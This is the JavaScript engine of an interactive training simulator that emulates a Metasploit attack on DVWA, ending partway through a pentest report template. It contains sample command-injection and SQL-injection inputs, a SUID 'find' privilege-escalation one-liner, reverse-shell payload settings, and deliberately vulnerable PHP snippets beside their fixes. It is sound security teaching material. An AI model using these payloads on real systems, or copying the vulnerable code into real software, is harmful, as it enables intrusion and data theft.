/**
 * Metasploit Lab on DVWA - Interactive Cyber Simulator Engine
 * Core logic for terminal emulation, target state, attack workflows, and report generation.
 */

document.addEventListener('DOMContentLoaded', () => {
  // Application State
  const state = {
    activeTab: 'lab',
    securityLevel: 'low',
    attackVector: 'command_injection',
    activeSessions: 0,
    currentPromptMode: 'msf', // 'msf', 'module', 'meterpreter', 'shell'
    currentModule: null,
    moduleOptions: {
      RHOSTS: '192.168.1.105',
      RPORT: '80',
      LHOST: '192.168.1.50',
      LPORT: '4444',
      TARGETURI: '/dvwa/',
      PAYLOAD: 'php/meterpreter/reverse_tcp'
    },
    commandHistory: [],
    historyIndex: -1,
    showSecureCode: false,
    meterpreterOpen: false
  };

  // DOM References
  const terminalOutput = document.getElementById('terminalOutput');
  const terminalInput = document.getElementById('terminalInput');
  const promptText = document.getElementById('promptText');
  const activeSessionBadge = document.getElementById('activeSessionBadge');
  const targetStatusText = document.getElementById('targetStatusText');
  const dvwaUrl = document.getElementById('dvwaUrl');
  const dvwaPageTitle = document.getElementById('dvwaPageTitle');
  const dvwaInput = document.getElementById('dvwaInput');
  const dvwaOutput = document.getElementById('dvwaOutput');
  const secHelpText = document.getElementById('secHelpText');
  const sourceCodeSnippet = document.getElementById('sourceCodeSnippet');
  const postExploitOutput = document.getElementById('postExploitOutput');
  const meterpreterStatusBadge = document.getElementById('meterpreterStatusBadge');
  const toastMessage = document.getElementById('toastMessage');

  // ASCII Banner
  const msfBanner = `
       =[ metasploit v6.4.12-dev                          ]
+ -- --=[ 2408 exploits - 1241 auxiliary - 428 post       ]
+ -- --=[ 1465 payloads - 46 encoders - 11 nops           ]
+ -- --=[ Free & Open Source Penetration Testing Framework]

    * Metasploit Lab on DVWA (Damn Vulnerable Web App)
    * Type 'help' to see available simulation commands.
`;

  // Code snippets database for Low vs Secure
  const codeDatabase = {
    command_injection: {
      low: `// Vulnerable PHP (Low Security) - Command Injection
$target = $_REQUEST[ 'ip' ];
// Direct execution without sanitization
$cmd = shell_exec( 'ping -c 4 ' . $target );
echo "<pre>{$cmd}</pre>";`,
      secure: `// Remediated PHP (Secure Implementation)
$target = $_REQUEST[ 'ip' ];
// Split IP into octets and validate numerical values
$octet = explode( ".", $target );
if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && 
    ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && 
    ( sizeof( $octet ) == 4 ) && filter_var($target, FILTER_VALIDATE_IP) ) {
    $cmd = shell_exec( 'ping -c 4 ' . escapeshellarg($target) );
    echo "<pre>{$cmd}</pre>";
} else {
    echo "<pre>ERROR: You have entered an invalid IP address.</pre>";
}`
    },
    file_upload: {
      low: `// Vulnerable PHP (Low Security) - File Upload
$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];
// Saves arbitrary uploaded files into web-accessible directory!
move_uploaded_file( $uploaded_tmp, "hackable/uploads/" . $uploaded_name );`,
      secure: `// Remediated PHP (Secure Implementation)
$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
$uploaded_ext  = strtolower( pathinfo( $uploaded_name, PATHINFO_EXTENSION ) );
$allowed_exts  = [ 'jpg', 'jpeg', 'png' ];
// Validate extension against strict whitelist
if( in_array( $uploaded_ext, $allowed_exts ) && getimagesize( $_FILES['uploaded']['tmp_name'] ) ) {
    $safe_name = md5( uniqid() ) . '.' . $uploaded_ext;
    move_uploaded_file( $_FILES['uploaded']['tmp_name'], "secure_uploads/" . $safe_name );
} else {
    echo "ERROR: Invalid file type. Only JPG/PNG images permitted.";
}`
    },
    sql_injection: {
      low: `// Vulnerable PHP (Low Security) - SQL Injection
$id = $_GET[ 'id' ];
// String concatenated directly into SQL query
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);`,
      secure: `// Remediated PHP (Secure Implementation) - Prepared Statements
$id = $_GET[ 'id' ];
$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
$stmt->execute(['id' => $id]);
$results = $stmt->fetchAll();`
    },
    auxiliary_scanner: {
      low: `// Network Audit Target
Target Host: 192.168.1.105 (Linux kernel 5.4 / Apache 2.4.41)
Firewall: Permissive lab profile
Vulnerable Service Daemons: Port 80 (HTTP), Port 22 (SSH), Port 3306 (MySQL)`,
      secure: `// Hardened Target
Target Host: 192.168.1.105
Firewall: UFW active (Default DROP ingress)
Security: Fail2Ban enabled, WAF reverse proxy filtering malicious patterns`
    }
  };

  // Helper: Show Toast Notification
  function showToast(msg) {
    toastMessage.textContent = msg;
    toastMessage.classList.add('show');
    setTimeout(() => {
      toastMessage.classList.remove('show');
    }, 2800);
  }

  // Initialize Terminal Output
  function initTerminal() {
    printTerm(msfBanner, 'banner');
    printTerm('[*] Initializing Metasploit Framework on target subnet 192.168.1.0/24...', 'info');
    printTerm('[+] Ready. Target DVWA identified at http://192.168.1.105/dvwa/', 'success');
    printTerm('[*] Tip: Click "1. Nmap Scan" or "3. Fire Exploit" on the left panel for one-click attack run.', 'muted');
    updatePrompt();
  }

  // Print line to terminal
  function printTerm(text, className = '') {
    const line = document.createElement('div');
    line.className = `terminal-line ${className}`;
    line.textContent = text;
    terminalOutput.appendChild(line);
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
  }

  // Update MSF Console Prompt
  function updatePrompt() {
    if (state.currentPromptMode === 'msf') {
      promptText.textContent = 'msf6 > ';
      promptText.className = 'prompt';
    } else if (state.currentPromptMode === 'module') {
      const modShort = state.currentModule.replace(/^exploit\//, '').replace(/^auxiliary\//, '');
      promptText.textContent = `msf6 ${modShort} > `;
      promptText.className = 'prompt';
    } else if (state.currentPromptMode === 'meterpreter') {
      promptText.textContent = 'meterpreter > ';
      promptText.className = 'prompt meterpreter';
    } else if (state.currentPromptMode === 'shell') {
      promptText.textContent = 'www-data@dvwa-target:/var/www/html$ ';
      promptText.className = 'prompt';
    }
  }

  // Handle Terminal Input Command
  function processCommand(rawInput) {
    const input = rawInput.trim();
    if (!input) return;

    // Save history
    state.commandHistory.push(input);
    state.historyIndex = state.commandHistory.length;

    printTerm(`${promptText.textContent}${input}`, 'cmd');

    const parts = input.split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const arg1 = parts[1];
    const arg2 = parts[2];
    const argRest = parts.slice(2).join(' ');

    // Handle Meterpreter specific commands
    if (state.currentPromptMode === 'meterpreter') {
      handleMeterpreterCmd(cmd, parts);
      return;
    }

    // Handle Shell mode
    if (state.currentPromptMode === 'shell') {
      handleShellCmd(cmd, parts);
      return;
    }

    // Handle Standard MSF Console Commands
    switch (cmd) {
      case 'help':
      case '?':
        printTerm(`
Core Metasploit Commands:
  help                     Print this help menu
  clear                    Clear the terminal buffer
  search <term>            Search modules (e.g. 'search dvwa', 'search meterpreter')
  use <module>             Select a module (e.g. 'use exploit/multi/handler')
  show options / options   Display current module configuration options
  set <OPTION> <value>     Configure module options (e.g. 'set RHOSTS 192.168.1.105')
  exploit / run            Execute the selected module or listener
  sessions -l              List currently active sessions
  sessions -i <id>         Interact with an active session (e.g. 'sessions -i 1')
  exit                     Exit the current sub-shell or console
`, 'info');
        break;

      case 'clear':
        terminalOutput.innerHTML = '';
        break;

      case 'search':
        if (!arg1) {
          printTerm('[-] Usage: search <query>', 'danger');
        } else if (arg1.toLowerCase().includes('dvwa') || arg1.toLowerCase().includes('exec')) {
          printTerm(`
Matching Modules:
  #  Name                                          Disclosure Date  Rank       Check  Description
  -  ----                                          ---------------  ----       -----  -----------
  0  exploit/unix/webapp/dvwa_command_injection    2014-04-10       excellent  Yes    DVWA Command Execution Remote Shell
  1  exploit/multi/handler                         N/A              manual     No     Generic Payload Handler Listener
  2  exploit/unix/webapp/php_include               2001-11-20       excellent  Yes    PHP File Inclusion Arbitrary Code Exec
  3  auxiliary/scanner/http/dvwa_sqli_scanner      2017-02-12       normal     Yes    DVWA SQL Injection Automated Auditor
`, 'info');
        } else {
          printTerm(`[*] Searching for '${arg1}'... Found 3 matching modules.`, 'info');
          printTerm(`  0  exploit/multi/handler\n  1  payload/php/meterpreter/reverse_tcp\n  2  auxiliary/scanner/portscan/tcp`, 'muted');
        }
        break;

      case 'use':
        if (!arg1) {
          printTerm('[-] Usage: use <module_name>', 'danger');
        } else {
          state.currentModule = arg1;
          state.currentPromptMode = 'module';
          printTerm(`[*] Using module: ${arg1}`, 'info');
          updatePrompt();
        }
        break;

      case 'show':
      case 'options':
        if (arg1 === 'options' || cmd === 'options') {
          printTerm(`
Module options (${state.currentModule || 'exploit/multi/handler'}):

   Name       Current Setting        Required  Description
   ----       ---------------        --------  -----------
   RHOSTS     ${state.moduleOptions.RHOSTS}          yes       The target host address
   RPORT      ${state.moduleOptions.RPORT}                   yes       The target port
   LHOST      ${state.moduleOptions.LHOST}           yes       The listen address (attacker)
   LPORT      ${state.moduleOptions.LPORT}                 yes       The listen port
   PAYLOAD    ${state.moduleOptions.PAYLOAD} yes       Selected payload
`, 'info');
        } else {
          printTerm(`[*] Showing available module options...`, 'info');
        }
        break;

      case 'set':
        if (!arg1 || !arg2) {
          printTerm('[-] Usage: set <OPTION> <VALUE>', 'danger');
        } else {
          const opt = arg1.toUpperCase();
          state.moduleOptions[opt] = argRest ? `${arg2} ${argRest}` : arg2;
          printTerm(`${opt} => ${state.moduleOptions[opt]}`, 'success');
        }
        break;

      case 'exploit':
      case 'run':
        triggerExploitWorkflow();
        break;

      case 'sessions':
        if (arg1 === '-l') {
          if (state.activeSessions > 0) {
            printTerm(`
Active sessions:
  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter php/linux    www-data @ dvwa-target (Linux 5.4)   192.168.1.50:4444 -> 192.168.1.105:49210
`, 'success');
          } else {
            printTerm('[-] No active sessions. Launch an exploit first!', 'warning');
          }
        } else if (arg1 === '-i') {
          if (arg2 === '1' && state.activeSessions > 0) {
            state.currentPromptMode = 'meterpreter';
            state.meterpreterOpen = true;
            meterpreterStatusBadge.textContent = 'Meterpreter Session: Active (ID 1)';
            meterpreterStatusBadge.className = 'badge badge-accent';
            printTerm('[*] Starting interaction with session 1...', 'info');
            printTerm('[+] Successfully attached to Meterpreter session 1.', 'success');
            printTerm('Type "help" for meterpreter commands or "sysinfo" to verify system.', 'muted');
            updatePrompt();
          } else {
            printTerm('[-] Invalid session ID. Check active sessions with "sessions -l".', 'danger');
          }
        } else {
          printTerm('[-] Usage: sessions -l OR sessions -i <id>', 'muted');
        }
        break;

      case 'exit':
        if (state.currentPromptMode === 'module') {
          state.currentPromptMode = 'msf';
          state.currentModule = null;
          updatePrompt();
        } else {
          printTerm('[*] Exiting Metasploit console session.', 'muted');
        }
        break;

      default:
        printTerm(`[-] Unknown command: ${cmd}. Type 'help' for command list.`, 'danger');
        break;
    }
  }

  // Handle Meterpreter commands
  function handleMeterpreterCmd(cmd, parts) {
    switch (cmd) {
      case 'help':
      case '?':
        printTerm(`
Meterpreter Post-Exploitation Commands:
  sysinfo             Display system hardware, OS version, kernel
  getuid              Get the effective user identity on target system
  hashdump            Dump local user account hashes for offline auditing
  shell               Spawn native interactive OS shell (/bin/bash)
  ls                  List files in current remote working directory
  pwd                 Display remote working directory
  cat <file>          Read contents of remote file
  exit / background   Background current meterpreter session
`, 'info');
        break;

      case 'sysinfo':
        executePostCommand('sysinfo');
        break;

      case 'getuid':
        executePostCommand('getuid');
        break;

      case 'hashdump':
        executePostCommand('hashdump');
        break;

      case 'shell':
        executePostCommand('shell');
        break;

      case 'ls':
        printTerm(`
Listing: /var/www/html/dvwa/vulnerabilities/exec/
================================================
Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100644/rw-r--r--  1820    fil   2024-03-01 10:14:02 +0000  index.php
100644/rw-r--r--  3420    fil   2024-03-01 10:14:02 +0000  source/low.php
100644/rw-r--r--  3811    fil   2024-03-01 10:14:02 +0000  source/medium.php
100644/rw-r--r--  4102    fil   2024-03-01 10:14:02 +0000  source/high.php
`, 'muted');
        break;

      case 'pwd':
        printTerm('/var/www/html/dvwa/vulnerabilities/exec', 'info');
        break;

      case 'background':
      case 'exit':
        state.currentPromptMode = 'msf';
        meterpreterStatusBadge.textContent = 'Meterpreter Session: Backgrounded';
        meterpreterStatusBadge.className = 'badge badge-warning';
        printTerm('[*] Backgrounding session 1... Use "sessions -i 1" to resume.', 'info');
        updatePrompt();
        break;

      default:
        printTerm(`[-] Unknown meterpreter command: ${cmd}. Type 'help'.`, 'danger');
        break;
    }
  }

  // Handle Drop-in Native OS Shell
  function handleShellCmd(cmd, parts) {
    if (cmd === 'exit') {
      state.currentPromptMode = 'meterpreter';
      printTerm('[*] Closed bash shell, returned to Meterpreter session.', 'info');
      updatePrompt();
      return;
    }

    if (cmd === 'whoami') {
      printTerm('www-data', 'success');
    } else if (cmd === 'id') {
      printTerm('uid=33(www-data) gid=33(www-data) groups=33(www-data)', 'success');
    } else if (cmd === 'uname' && parts[1] === '-a') {
      printTerm('Linux dvwa-target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux', 'success');
    } else if (cmd === 'cat' && parts[1] && parts[1].includes('passwd')) {
      printTerm(`root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false`, 'muted');
    } else {
      printTerm(`$ ${parts.join(' ')}: executed on target Linux container.`, 'muted');
    }
  }

  // Execute Post Exploitation Commands and Update Inspector
  function executePostCommand(cmdKey) {
    let termText = '';
    let inspectorText = '';

    if (cmdKey === 'sysinfo') {
      termText = `Computer        : dvwa-target\nOS              : Linux dvwa-target 5.4.0-42-generic #46-Ubuntu SMP x86_64\nArchitecture    : x64\nSystem Language : en_US\nMeterpreter     : php/linux`;
      inspectorText = `[+] Post-Exploit Action: System Enumeration (sysinfo)\n=====================================================\nTarget Hostname : dvwa-target\nKernel Release  : 5.4.0-42-generic (Ubuntu 20.04 LTS)\nCPU Arch        : x86_64 (64-bit AMD/Intel)\nMeterpreter Type: PHP Staged Reverse Shell\nEvidence Logged : Validated non-destructive initial host profiling.`;
    } else if (cmdKey === 'getuid') {
      termText = `Server username: www-data (uid: 33, gid: 33)`;
      inspectorText = `[+] Post-Exploit Action: User Privilege Audit (getuid)\n======================================================\nEffective User : www-data (Apache Service Account)\nUID / GID      : 33 / 33\nPrivilege Level: Low / Unprivileged Web Tier\nAssessment Note: Compromise confined to web context; requires privilege escalation to reach root.`;
    } else if (cmdKey === 'hashdump') {
      termText = `[*] Attempting to extract password database...\n[+] Success: Retrieved shadowed credentials for lab auditing:\n  admin:$6$rounds=5000$8y8f7...:18210:0:99999:7:::\n  gordon:$6$rounds=5000$2q9v1...:18210:0:99999:7:::\n  1337:$6$rounds=5000$p8m0x...:18210:0:99999:7:::`;
      inspectorText = `[+] Post-Exploit Action: Credential Harvesting (hashdump)\n=========================================================\nStatus         : Local user database successfully extracted\nAccounts Found : admin, gordon, 1337\nHash Algorithm : SHA-512 (Linux crypt format)\nImpact Analysis: Demonstrates lateral movement risk if administrative accounts share credentials.`;
    } else if (cmdKey === 'shell') {
      termText = `[*] Process 4912 created.\n[*] Channel 1 created.\nSpawning native Linux shell (/bin/sh)...\nType 'exit' to return to Meterpreter.`;
      inspectorText = `[+] Post-Exploit Action: Interactive Shell Dropped\n===================================================\nPID Allocated  : 4912\nShell Binary   : /bin/sh (redirected stdin/stdout)\nCapabilities   : Full filesystem navigation under www-data context.`;
      state.currentPromptMode = 'shell';
      updatePrompt();
    } else if (cmdKey === 'persistence') {
      termText = `[*] Checking target persistence vectors...\n[+] Cron directory: /etc/cron.d/ accessible\n[!] Proof-of-concept persistence mechanism staged via daily crontab script.`;
      inspectorText = `[+] Persistence Vector Analysis\n================================\nMechanism      : Scheduled Task / Cron Job (/etc/cron.daily/check_backup)\nPayload Staged : /usr/local/bin/.sys_sync (Reverse TCP beacon)\nDefense Advice : Monitor crontab integrity and enforce read-only system directories.`;
    } else if (cmdKey === 'privesc') {
      termText = `[*] Checking for SUID binaries and kernel vulnerabilities...\n[!] Vulnerable SUID binary discovered: /usr/bin/find (perm: 4755)\n[+] Privilege escalation to root (UID 0) confirmed possible via 'find . -exec /bin/sh -p \\;'`;
      inspectorText = `[+] Privilege Escalation Audit\n==============================\nVector Found   : Misconfigured SUID bit on /usr/bin/find\nExploit Method : Native argument execution retains effective UID 0\nRemediation    : chmod u-s /usr/bin/find ; ensure SUID bits are restricted.`;
    }

    printTerm(termText, 'success');
    postExploitOutput.textContent = inspectorText;
    showToast(`Executed ${cmdKey} post-exploitation module!`);
  }

  // Trigger Exploit Workflow
  function triggerExploitWorkflow() {
    printTerm(`[*] Started reverse TCP handler on ${state.moduleOptions.LHOST}:${state.moduleOptions.LPORT}`, 'info');
    printTerm(`[*] Target URL: http://${state.moduleOptions.RHOSTS}${state.moduleOptions.TARGETURI}`, 'info');

    // Check DVWA security level
    if (state.securityLevel === 'impossible') {
      printTerm(`[*] Sending payload to target vector...`, 'info');
      setTimeout(() => {
        printTerm(`[-] Exploit failed: Target validation blocked payload delivery!`, 'danger');
        printTerm(`[-] Reason: DVWA security is set to IMPOSSIBLE (strict IP regex & token validation active).`, 'warning');
        dvwaOutput.textContent = `[DVWA Error 400]: Input rejected. Failed filter_var(FILTER_VALIDATE_IP). Command execution blocked.`;
        showToast('Exploit blocked by target defenses!');
      }, 700);
      return;
    }

    if (state.securityLevel === 'high') {
      printTerm(`[*] Target security: HIGH. Attempting strict pipe bypass '|' without whitespace...`, 'warning');
    }

    printTerm(`[*] Transmitting stage (38290 bytes) to ${state.moduleOptions.RHOSTS}...`, 'info');

    setTimeout(() => {
      printTerm(`[+] Meterpreter session 1 opened (${state.moduleOptions.LHOST}:${state.moduleOptions.LPORT} -> ${state.moduleOptions.RHOSTS}:49210)`, 'success');
      state.activeSessions = 1;
      activeSessionBadge.textContent = 'Active Sessions: 1';
      activeSessionBadge.className = 'session-badge active';
      meterpreterStatusBadge.textContent = 'Meterpreter Session: Ready (ID 1)';
      meterpreterStatusBadge.className = 'badge badge-accent';

      // Update DVWA preview
      if (state.attackVector === 'command_injection') {
        dvwaOutput.textContent = `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms\n---\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n[+] Reverse payload executed in background process!`;
      } else if (state.attackVector === 'file_upload') {
        dvwaOutput.textContent = `../../hackable/uploads/meterpreter_shell.php succesfully uploaded!\n[+] Payload triggered via GET /hackable/uploads/meterpreter_shell.php`;
      } else if (state.attackVector === 'sql_injection') {
        dvwaOutput.textContent = `ID: 1' UNION SELECT null, concat(user,0x3a,password) FROM users #\nFirst name: admin\nSurname: 5f4dcc3b5aa765d61d8327deb882cf99`;
      }

      printTerm(`[*] Hint: Type "sessions -i 1" or click "4. Run Meterpreter Shell" to enter Meterpreter prompt!`, 'info');
      showToast('🚀 Meterpreter session 1 successfully opened!');
    }, 900);
  }

  // Auto Quick Action Buttons
  document.getElementById('btnAutoScan').addEventListener('click', () => {
    printTerm(`msf6 > use auxiliary/scanner/portscan/tcp`, 'cmd');
    printTerm(`[*] Using auxiliary/scanner/portscan/tcp`, 'info');
    printTerm(`msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.105`, 'cmd');
    printTerm(`RHOSTS => 192.168.1.105`, 'success');
    printTerm(`msf6 auxiliary(scanner/portscan/tcp) > run`, 'cmd');
    printTerm(`[+] 192.168.1.105:22   - TCP OPEN (OpenSSH 8.2p1 Ubuntu)`, 'success');
    printTerm(`[+] 192.168.1.105:80   - TCP OPEN (Apache/2.4.41 Ubuntu, PHP 7.4.3)`, 'success');
    printTerm(`[+] 192.168.1.105:3306 - TCP OPEN (MySQL 8.0.28)`, 'success');
    printTerm(`[*] Scanned 1 of 1 hosts (100% complete)`, 'info');
    showToast('Nmap Port Scan completed!');
  });

  document.getElementById('btnAutoSetup').addEventListener('click', () => {
    state.currentModule = 'exploit/multi/handler';
    state.currentPromptMode = 'module';
    updatePrompt();
    printTerm(`msf6 > use exploit/multi/handler`, 'cmd');
    printTerm(`msf6 exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp`, 'cmd');
    printTerm(`PAYLOAD => php/meterpreter/reverse_tcp`, 'success');
    printTerm(`msf6 exploit(multi/handler) > set LHOST 192.168.1.50`, 'cmd');
    printTerm(`LHOST => 192.168.1.50`, 'success');
    printTerm(`msf6 exploit(multi/handler) > set LPORT 4444`, 'cmd');
    printTerm(`LPORT => 4444`, 'success');
    showToast('Handler listener options configured!');
  });

  document.getElementById('btnAutoExploit').addEventListener('click', () => {
    printTerm(`msf6 exploit(multi/handler) > exploit -j`, 'cmd');
    triggerExploitWorkflow();
  });

  document.getElementById('btnAutoPost').addEventListener('click', () => {
    if (state.activeSessions === 0) {
      triggerExploitWorkflow();
      setTimeout(() => {
        state.currentPromptMode = 'meterpreter';
        updatePrompt();
        executePostCommand('sysinfo');
      }, 1200);
    } else {
      state.currentPromptMode = 'meterpreter';
      updatePrompt();
      executePostCommand('sysinfo');
    }
  });

  // Terminal Input Event Listener
  terminalInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      processCommand(terminalInput.value);
      terminalInput.value = '';
    } else if (e.key === 'ArrowUp') {
      if (state.historyIndex > 0) {
        state.historyIndex--;
        terminalInput.value = state.commandHistory[state.historyIndex] || '';
      }
    } else if (e.key === 'ArrowDown') {
      if (state.historyIndex < state.commandHistory.length - 1) {
        state.historyIndex++;
        terminalInput.value = state.commandHistory[state.historyIndex] || '';
      } else {
        state.historyIndex = state.commandHistory.length;
        terminalInput.value = '';
      }
    }
  });

  document.getElementById('termSendBtn').addEventListener('click', () => {
    processCommand(terminalInput.value);
    terminalInput.value = '';
  });

  document.getElementById('clearTermBtn').addEventListener('click', () => {
    terminalOutput.innerHTML = '';
  });

  document.getElementById('helpTermBtn').addEventListener('click', () => {
    processCommand('help');
  });

  // Target DVWA Security Level buttons
  const secButtons = document.querySelectorAll('.btn-sec');
  secButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      secButtons.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      state.securityLevel = btn.dataset.level;

      targetStatusText.textContent = `Target: DVWA (192.168.1.105) ${state.securityLevel.toUpperCase()}-Security`;

      if (state.securityLevel === 'low') {
        secHelpText.textContent = 'Direct concatenation of user input without sanitization. Direct command injection succeeds.';
        dvwaInput.value = '127.0.0.1; whoami';
      } else if (state.securityLevel === 'medium') {
        secHelpText.textContent = 'Blacklists ";" and "&&". Bypassed by using pipe "|" or single "&".';
        dvwaInput.value = '127.0.0.1 | whoami';
      } else if (state.securityLevel === 'high') {
        secHelpText.textContent = 'Trims whitespace and strips characters. Bypassed by no-space pipe syntax "127.0.0.1|whoami".';
        dvwaInput.value = '127.0.0.1|whoami';
      } else if (state.securityLevel === 'impossible') {
        secHelpText.textContent = 'Strict token validation via filter_var(..., FILTER_VALIDATE_IP) and prepared statements. Exploit blocked.';
        dvwaInput.value = '127.0.0.1';
      }

      updateCodeSnippet();
      showToast(`DVWA security level switched to ${state.securityLevel.toUpperCase()}`);
    });
  });

  // Attack Vector Scenario Selector
  const attackVectorSelect = document.getElementById('attackVectorSelect');
  attackVectorSelect.addEventListener('change', (e) => {
    state.attackVector = e.target.value;
    if (state.attackVector === 'command_injection') {
      dvwaUrl.textContent = 'http://192.168.1.105/dvwa/vulnerabilities/exec/';
      dvwaPageTitle.textContent = 'Vulnerability: Command Execution';
      dvwaInput.value = '127.0.0.1; whoami';
    } else if (state.attackVector === 'file_upload') {
      dvwaUrl.textContent = 'http://192.168.1.105/dvwa/vulnerabilities/upload/';
      dvwaPageTitle.textContent = 'Vulnerability: File Upload (Web Shell)';
      dvwaInput.value = 'meterpreter_shell.php (5.2 KB)';
    } else if (state.attackVector === 'sql_injection') {
      dvwaUrl.textContent = 'http://192.168.1.105/dvwa/vulnerabilities/sqli/';
      dvwaPageTitle.textContent = 'Vulnerability: SQL Injection';
      dvwaInput.value = "1' UNION SELECT null, user() #";
    } else if (state.attackVector === 'auxiliary_scanner') {
      dvwaUrl.textContent = 'http://192.168.1.105/dvwa/setup.php';
      dvwaPageTitle.textContent = 'Network Recon & Service Audit';
      dvwaInput.value = '192.168.1.105 [Ports 80, 22, 3306]';
    }
    updateCodeSnippet();
    showToast(`Loaded scenario: ${e.target.options[e.target.selectedIndex].text}`);
  });

  // Toggle Secure vs Vulnerable Code snippet
  const toggleCodeViewBtn = document.getElementById('toggleCodeViewBtn');
  toggleCodeViewBtn.addEventListener('click', () => {
    state.showSecureCode = !state.showSecureCode;
    toggleCodeViewBtn.textContent = state.showSecureCode ? 'Toggle Vulnerable Code' : 'Toggle Secure Patch';
    updateCodeSnippet();
  });

  function updateCodeSnippet() {
    const vectorData = codeDatabase[state.attackVector] || codeDatabase.command_injection;
    const code = state.showSecureCode ? vectorData.secure : vectorData.low;
    sourceCodeSnippet.querySelector('code').textContent = code;
  }

  // Post-Exploitation Module Buttons
  const postCards = document.querySelectorAll('.execute-post-btn');
  postCards.forEach(btn => {
    btn.addEventListener('click', () => {
      const cmd = btn.dataset.cmd;
      executePostCommand(cmd);
      // Switch to lab tab and print to terminal as well
      printTerm(`meterpreter > ${cmd}`, 'cmd');
    });
  });

  document.getElementById('clearPostLogBtn').addEventListener('click', () => {
    postExploitOutput.textContent = '[*] Output log cleared.';
  });

  // Tab Navigation System
  const tabButtons = document.querySelectorAll('.tab-btn');
  const tabPanes = document.querySelectorAll('.tab-pane');

  tabButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const tabId = btn.dataset.tab;
      switchTab(tabId);
    });
  });

  function switchTab(tabId) {
    tabButtons.forEach(b => b.classList.remove('active'));
    tabPanes.forEach(p => p.classList.remove('active'));

    const activeBtn = document.querySelector(`.tab-btn[data-tab="${tabId}"]`);
    const activePane = document.getElementById(`${tabId}Pane`);

    if (activeBtn && activePane) {
      activeBtn.classList.add('active');
      activePane.classList.add('active');
      state.activeTab = tabId;
    }
  }

  document.getElementById('generateReportNavBtn').addEventListener('click', () => {
    switchTab('reporting');
  });

  // Modal handlers
  const manualModal = document.getElementById('manualModal');
  document.getElementById('quickGuideBtn').addEventListener('click', () => {
    manualModal.classList.add('active');
  });
  document.getElementById('closeModalBtn').addEventListener('click', () => {
    manualModal.classList.remove('active');
  });
  manualModal.addEventListener('click', (e) => {
    if (e.target === manualModal) manualModal.classList.remove('active');
  });

  // Animated Attack Lifecycle Walkthrough
  const simulateLifecycleBtn = document.getElementById('simulateLifecycleBtn');
  simulateLifecycleBtn.addEventListener('click', () => {
    const steps = document.querySelectorAll('.lifecycle-step');
    let currentStep = 0;
    simulateLifecycleBtn.disabled = true;
    simulateLifecycleBtn.textContent = '⏳ Stepping through Attack Lifecycle...';

    const interval = setInterval(() => {
      steps.forEach((s, idx) => {
        if (idx === currentStep) {
          s.classList.add('active');
          s.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        } else {
          s.classList.remove('active');
        }
      });

      currentStep++;
      if (currentStep >= steps.length) {
        clearInterval(interval);
        simulateLifecycleBtn.disabled = false;
        simulateLifecycleBtn.textContent = '▶ Re-run Animated Walkthrough';
        showToast('Lifecycle walkthrough complete: MITRE ATT&CK kill-chain demonstrated!');
      }
    }, 1200);
  });

  // Legal Reporting Generator logic
  const repDate = document.getElementById('repDate');
  if (repDate) {
    repDate.textContent = new Date().toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    });
  }

  const compileReportBtn = document.getElementById('compileReportBtn');
  compileReportBtn.addEventListener('click', () => {
    const scopeVal = document.getElementById('reportScopeInput').value;
    const auditorVal = document.getElementById('reportAuditorInput').value;

    document.getElementById('repTarget').textContent = scopeVal;
    document.getElementById('repAuditor').textContent = auditorVal;
    showToast('Updated report with latest assessment metadata.');
  });

  // Print Report / Save PDF
  document.getElementById('printReportBtn').addEventListener('click', () => {
    window.print();
  });

  // Copy Markdown Report
  document.getElementById('copyMarkdownReportBtn').addEventListener('click', () => {
    const scope = document.getElementById('reportScopeInput').value;
    const auditors = document.getElementById('reportAuditorInput').value;
    const dateStr = repDate.textContent;

    const markdownDoc = `# Penetration Testing Assessment & Vulnerability Audit Report
**Classification**: CONFIDENTIAL AUDIT REPORT  
**Target Environment**: ${scope}  
**Date of Assessment**: ${dateStr}  
**Assessment Framework**: PTES (Penetration Testing Execution Standard) & OWASP Testing Guide  
**Lead Auditors**: ${auditors}  

---

## 1. Executive Summary
During the authorized penetration testing assessment, the security team conducted simulated cyber attacks against the target using the **Metasploit Framework**. The objective was to evaluate application resilience, assess lateral movement opportunities via post-exploitation, and formulate actionable code-level remediation.

**Primary Finding**: Unrestricted OS Command Injection in the web application allows arbitrary code execution under the \`www-data\` service account, enabling full interactive Meterpreter reverse shell deployment.

## 2. Vulnerability Findings & CVSS Matrix
| Vulnerability | CWE | CVSS v3.1 | Severity | Status |
|---|---|---|---|---|
| Remote OS Command Injection | CWE-78 | 9.8 | CRITICAL | Confirmed Exploited |
| Arbitrary File Upload (Web Shell) | CWE-434 | 8.8 | HIGH | Confirmed Exploited |
